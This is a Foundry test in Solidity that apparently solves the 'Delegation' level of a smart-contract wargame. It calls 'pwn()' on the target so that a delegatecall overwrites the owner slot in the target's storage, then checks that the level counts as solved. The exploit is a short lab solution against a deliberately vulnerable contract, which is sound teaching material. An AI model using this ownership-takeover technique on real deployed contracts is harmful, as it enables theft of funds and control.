// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DelegationFactory} from "src/levels/DelegationFactory.sol";

contract DelegationTest is Test {
    DelegationFactory public level;
    address public target;
    address public player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new DelegationFactory();
        player = makeAddr("PLAYER");
        target = level.createInstance(player);
    }

    function test_Delegation() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.prank(player);

        // pwn() function exectuted in context of caller(target)
        // so, it modifies caller's state variable at same storage slot
        (bool sent, ) = target.call(abi.encodeWithSignature("pwn()"));
        require(sent, "call failed");

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(target), player);
        assertEq(success, true);
    }
}
